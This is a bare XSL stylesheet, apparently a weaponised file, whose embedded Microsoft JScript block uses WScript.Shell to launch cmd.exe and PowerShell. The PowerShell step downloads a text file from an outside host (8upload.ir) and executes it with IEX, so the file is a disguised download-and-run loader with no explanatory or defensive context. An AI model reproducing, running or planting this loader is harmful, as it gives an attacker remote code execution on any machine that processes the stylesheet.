<?xml version='1.0'?>
<stylesheet
xmlns="http://www.w3.org/1999/XSL/Transform" xmlns:ms="urn:schemas-microsoft-com:xslt"
xmlns:user="placeholder"
version="1.0">
<output method="text"/>
	<ms:script implements-prefix="user" language="JScript">
	<![CDATA[
	var r = new ActiveXObject("WScript.Shell").Run("cmd.exe /c powershell IEX(New-Object Net.WebClient).DownloadString('http://8upload.ir/uploads/f329235.txt')");
	]]> </ms:script>
</stylesheet>
